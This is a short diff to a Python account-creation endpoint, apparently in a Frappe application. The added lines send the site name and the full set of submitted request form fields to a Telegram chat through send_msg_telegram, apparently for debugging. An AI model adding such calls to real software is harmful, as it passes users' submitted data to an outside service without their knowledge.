@@ -22,8 +22,11 @@ def create_account():
     # ‘balance_must_be’ => 'Debit | Credit'
     
     try:
+        from frappe.utils import get_site_name
+        site_name = get_site_name(frappe.local.request.host)
         # send_msg_telegram(str(data))
-
+        send_msg_telegram(str(site_name))
+        send_msg_telegram(str(frappe.form_dict))
         account_name = frappe.form_dict['account_name']
         # is_group = frappe.form_dict['is_group']
         company = frappe.form_dict['company']
